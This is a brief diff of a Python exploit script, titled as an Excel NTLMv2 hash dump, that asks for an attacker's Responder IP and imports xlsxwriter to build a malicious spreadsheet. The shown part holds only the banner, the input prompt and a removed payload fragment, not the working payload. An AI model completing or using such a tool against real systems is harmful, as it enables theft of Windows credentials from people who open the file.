@@ -1,8 +1,10 @@
 #!/usr/bin/python3
+print("-----================================================----")
+print("Excel2013/16/19 - Win7/8/10 NTLMv2 hash dump")
+print("-----================================================-----")
 
-payload = "'A01"
-lhost = raw_input("enter value:")
-exploit = lhost+payload
+lhost = raw_input("Enter your Responder IP:  ")
+
 
 import xlsxwriter
 
